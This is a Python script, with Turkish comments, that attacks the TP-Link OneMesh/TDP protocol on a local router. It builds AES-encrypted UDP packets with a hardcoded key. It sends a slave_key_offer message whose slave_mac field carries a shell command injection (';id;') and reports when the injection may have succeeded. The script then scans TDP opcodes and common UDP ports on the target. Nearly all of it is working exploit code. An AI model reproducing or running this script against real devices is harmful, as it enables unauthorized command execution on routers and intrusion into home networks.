import socket
import struct
import json
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import zlib
import time

KEY = b'TPONEMESH_Kf!xn?'[:16]
IV = b'1234567890abcdef'

def create_cipher():
    return AES.new(KEY, AES.MODE_CBC, IV)

def decrypt_response(encrypted_data):
    """TDP yanıtını çöz"""
    try:
        cipher = create_cipher()
        decrypted = cipher.decrypt(encrypted_data)
        # PKCS7 padding'i kaldır
        padding_len = decrypted[-1]
        if padding_len <= 16:
            return decrypted[:-padding_len]
        return decrypted
    except:
        return None

def calculate_checksum(packet_data):
    m_data = bytearray(packet_data)
    struct.pack_into('<I', m_data, 12, 0x5a6b7c8d)
    return zlib.crc32(m_data) & 0xffffffff

def create_tdp_packet(opcode, payload_json):
    cipher = create_cipher()
    json_str = json.dumps(payload_json)
    encrypted_payload = cipher.encrypt(pad(json_str.encode(), AES.block_size))
    
    header = bytearray(16)
    header[0] = 0x01
    header[1] = 0xf0
    struct.pack_into('<H', header, 2, opcode)
    struct.pack_into('<H', header, 4, 16 + len(encrypted_payload))
    header[6] = 0x01
    
    full_packet = bytearray(header) + bytearray(encrypted_payload)
    checksum = calculate_checksum(full_packet)
    struct.pack_into('<I', full_packet, 12, checksum)
    
    return bytes(full_packet)

TARGET_IP = "192.168.68.1"
TARGET_PORT = 20002

# Dinleme socket'i oluştur
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.settimeout(3)
sock.bind(('0.0.0.0', 20003))  # Kendi portumuzu dinleyelim

print("[*] TDP Debug Başlatılıyor...")
print("="*50)

# 1. attach_master gönder ve yanıtı bekle
print("\n[1] attach_master gönderiliyor...")
attach_payload = {
    "method": "attach_master",
    "data": {
        "group_id": "-1",
        "master_mac": "AA:BB:CC:DD:EE:FF"
    }
}

attach_packet = create_tdp_packet(opcode=0x0004, payload_json=attach_payload)
print(f"[*] Paket boyutu: {len(attach_packet)} bytes")
print(f"[*] Hex (ilk 32): {attach_packet[:32].hex()}")

sock.sendto(attach_packet, (TARGET_IP, TARGET_PORT))

# Yanıtı kontrol et
try:
    data, addr = sock.recvfrom(4096)
    print(f"[+] YANIT ALINDI! {len(data)} bytes, kaynak: {addr}")
    print(f"[+] Ham yanıt (hex): {data.hex()}")
    
    if len(data) > 16:
        # Başlığı parse et
        header = data[:16]
        version = header[0]
        msg_type = header[1]
        opcode = struct.unpack('<H', header[2:4])[0]
        length = struct.unpack('<H', header[4:6])[0]
        flags = header[6]
        
        print(f"[+] Başlık: version={version}, msg_type={hex(msg_type)}, opcode={hex(opcode)}, length={length}")
        
        # Yanıtı çözmeyi dene
        encrypted = data[16:]
        decrypted = decrypt_response(encrypted)
        if decrypted:
            try:
                response_json = json.loads(decrypted.decode())
                print(f"[+] Çözülmüş yanıt: {json.dumps(response_json, indent=2)}")
            except:
                print(f"[+] Çözülmüş veri (string): {decrypted}")
        else:
            print("[-] Şifre çözülemedi")
except socket.timeout:
    print("[-] attach_master için yanıt alınamadı (timeout)")

# 2. slave_key_offer dene
print("\n[2] slave_key_offer gönderiliyor...")
exploit_payload = {
    "method": "slave_key_offer",
    "data": {
        "group_id": "-1",
        "ip": "192.168.68.100",
        "slave_mac": "';id;'",  # Basit test
        "slave_private_account": "dummy",
        "slave_private_password": "dummy",
        "want_to_join": False,
        "model": "RE300",
        "product_type": "RangeExtender",
        "operation_mode": "RE"
    }
}

exploit_packet = create_tdp_packet(opcode=0x0006, payload_json=exploit_payload)
sock.sendto(exploit_packet, (TARGET_IP, TARGET_PORT))

# Yanıtı kontrol et
try:
    data, addr = sock.recvfrom(4096)
    print(f"[+] YANIT ALINDI! {len(data)} bytes")
    
    if len(data) > 16:
        decrypted = decrypt_response(data[16:])
        if decrypted:
            try:
                response_json = json.loads(decrypted.decode())
                print(f"[+] Yanıt: {json.dumps(response_json, indent=2)}")
                if response_json.get('error_code') == 0:
                    print("[!] BAŞARILI! Komut enjeksiyonu çalışmış olabilir!")
            except:
                print(f"[+] Çözülmüş: {decrypted}")
except socket.timeout:
    print("[-] slave_key_offer için yanıt alınamadı")

# 3. Farklı opcode'ları tara
print("\n[3] TDP Opcode taraması...")
opcodes = [0x0001, 0x0002, 0x0003, 0x0005, 0x0007, 0x0008, 0x0009, 0x000A, 0x000B, 0x000C, 0x000D, 0x000E]

for opcode in opcodes:
    test_payload = {
        "method": "test",
        "data": {"test": "value"}
    }
    packet = create_tdp_packet(opcode=opcode, payload_json=test_payload)
    sock.sendto(packet, (TARGET_IP, TARGET_PORT))
    
    try:
        data, addr = sock.recvfrom(1024)
        print(f"[+] Opcode {hex(opcode)} yanıt verdi: {len(data)} bytes")
    except socket.timeout:
        print(f"[-] Opcode {hex(opcode)} timeout")

sock.close()

# 4. UDP portlarını kontrol et
print("\n[4] UDP Port Taraması...")
udp_ports = [1900, 20001, 20002, 53, 67, 68, 123, 161, 500, 1900, 5353]

for port in udp_ports:
    test_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    test_sock.settimeout(1)
    try:
        test_sock.sendto(b'\x00', (TARGET_IP, port))
        data, _ = test_sock.recvfrom(1024)
        print(f"[+] UDP {port} AÇIK - Yanıt: {len(data)} bytes")
    except socket.timeout:
        pass
    except Exception as e:
        print(f"[!] UDP {port} - {e}")
    test_sock.close()